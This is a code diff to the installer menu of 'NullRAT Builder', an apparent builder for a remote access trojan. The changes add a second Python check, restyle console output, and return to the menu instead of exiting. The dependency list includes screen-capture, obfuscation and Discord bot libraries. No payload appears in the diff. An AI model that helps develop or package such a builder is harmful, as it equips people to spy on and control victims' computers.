@@ -78,7 +78,8 @@ proc packageInstaller() =
     echo ""
     stdout.styledWriteLine({styleBright}, "[1] Checking for Python...")
     var status: int = execShellCmd("python --version")
-    if status == 0:
+    var status2: int = execShellCmd("py --version")
+    if status == 0 or status2 == 0:
         echo "Python installed!"
         stdout.styledWriteLine({styleBright}, "[2] Checking if packages already installed...")
         var result = execCmdEx("pip freeze")
@@ -98,14 +99,13 @@ proc packageInstaller() =
                 stdout.styledWriteLine({styleBright}, "[3] Installing dependencies...")
                 var res = execShellCmd("pip install pyinstaller==4.10 virtualenv aiohttp disnake requests mss pyarmor")
                 if res == 0:
-					echo ""
-					echo "========================"
-                    echo "All Installed! Moving to variables creation..."
+                    echo "========================"
+                    stdout.styledWriteLine({styleBright}, "All Installed! Moving to variables creation...")
                     sleep(2000)
                     variablesCreator()
 
     else:
-        echo "Python not installed!\nWould you like to download the recommended python installer? (Y/n): "
+        stdout.styledWriteLine({styleBright}, "Python not installed!\nWould you like to download the recommended python installer? (Y/n): ")
         var input: char = getch();
         if input == 'N' or input == 'n':
             echo "NullRAT Builder cannot continue otherwise!!! Exiting..."
@@ -114,16 +114,20 @@ proc packageInstaller() =
         else:
             openDefaultBrowser("https://www.python.org/ftp/python/3.8.10/python-3.8.10.exe")
             echo ""
-            echo "Your browser should start downloading the installer already."
-            echo "Since we do not support automatic installation of python, you have to run the installer manually"
-            echo "After running, please tick 'Install for All Users' and  'Add Python 3.8 to PATH', then install it"
-            echo "After installing, check if everything is functional by running NullRAT builder again."
+            stdout.styledWriteLine({styleBright}, "Your browser should start downloading the installer already.")
+            stdout.styledWriteLine({styleBright}, "Since we do not support automatic installation of python,")
+            stdout.styledWriteLine({styleBright}, "you have to run the installer manually.")
+            stdout.styledWriteLine({styleBright}, "After running, please tick 'Install for All Users'")
+            stdout.styledWriteLine({styleBright}, "and 'Add Python 3.8 to PATH', then install it")
+            stdout.styledWriteLine({styleBright}, "After installing, check if everything is functional")
+            stdout.styledWriteLine({styleBright}, "by running NullRAT builder again.")
             echo ""
-            stdout.styledWriteLine({styleBright}, "Exiting in 30 seconds. Thank you for using NullRAT")
+            stdout.styledWriteLine({styleBright}, "Returning to menu in 30 seconds...")
             sleep(30000)
-            quit(2)
+            return
     
 proc mainMenu() =
+    cls()
     printName();
     stdout.styledWriteLine({styleBright}, "  >> NullRAT Builder v1.1 <<")
     echo ""
